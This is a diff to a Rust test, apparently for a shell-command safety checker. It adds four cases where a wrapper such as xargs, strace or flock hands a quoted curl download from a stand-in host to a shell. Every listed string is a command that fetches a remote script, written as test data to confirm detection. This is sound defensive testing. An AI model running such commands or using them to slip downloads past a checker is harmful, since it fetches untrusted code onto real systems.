@@ -1516,6 +1516,10 @@ fn a_substitution_in_a_quote_is_text_unless_a_shell_is_given_it() {
         "true;eval 'x=$(curl -o f.sh https://x.example/f.sh)'",
         "find . -exec $SHELL -c 'x=$(curl -o f.sh https://x.example/f.sh)' ;",
         "sudo -E $SHELL -c 'x=$(curl -o f.sh https://x.example/f.sh)'",
+        "xargs -0 $SHELL -c 'x=$(curl -o f.sh https://x.example/f.sh)'",
+        "xargs -r \"$SHELL\" -c 'x=$(curl -o f.sh https://x.example/f.sh)'",
+        "strace -f ${sh:-bash} -c 'x=$(curl -o f.sh https://x.example/f.sh)'",
+        "flock -n $lock -c 'x=$(curl -o f.sh https://x.example/f.sh)'",
         "x=\"bash -c\"; $x 'x=$(curl -o f.sh https://x.example/f.sh)'",
         "\"bash\" -c 'x=$(curl -o f.sh https://x.example/f.sh)'",
         // Inside a backtick substitution too.
